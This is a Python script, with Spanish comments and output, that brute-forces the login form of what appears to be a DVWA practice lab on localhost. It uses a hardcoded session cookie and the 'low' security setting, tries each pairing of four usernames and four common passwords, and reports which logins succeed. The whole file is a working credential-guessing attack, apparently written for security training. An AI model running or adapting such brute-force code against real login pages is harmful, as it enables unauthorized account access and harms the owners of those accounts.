import requests

BASE = "http://127.0.0.1:8081"
HOST = "127.0.0.1"
PHPSESSID = "c9266rjs5qd3lu4rp8frl6gpa6"

USERS = ["admin", "smithy", "michael", "chris"]
PASSWORDS = ["password", "123456", "dragon", "football"]


def run_bruteforce() -> None:
    """Ejecuta las combinaciones con formato de salida distinto, misma lógica."""
    total = len(USERS) * len(PASSWORDS)

    with requests.Session() as session:
        session.cookies.set("PHPSESSID", PHPSESSID, domain=HOST, path="/")
        session.cookies.set("security", "low", domain=HOST, path="/")

        print("== Intentos de autenticación ==")
        print(f"URL destino: {BASE}")
        print(f"Combinaciones totales: {total}")
        print("-" * 56)
        print(f"{'N°':>3}  {'usuario':<10} {'password':<10} {'estado':<5}")
        print("-" * 56)

        intentos = 0
        validos = 0

        for usuario in USERS:
            for clave in PASSWORDS:
                intentos += 1
                respuesta = session.get(
                    f"{BASE}/vulnerabilities/brute/",
                    params={"username": usuario, "password": clave, "Login": "Login"},
                    timeout=8,
                    allow_redirects=True,
                )

                invalido = "username and/or password incorrect" in respuesta.text.lower()
                estado = "OK" if not invalido else "BAD"
                if estado == "OK":
                    validos += 1

                print(f"{intentos:>3}  {usuario:<10} {clave:<10} {estado:<5}")

        print("-" * 56)
        print(f"Resumen => intentos={intentos} | validos={validos}")


if __name__ == "__main__":
    run_bruteforce()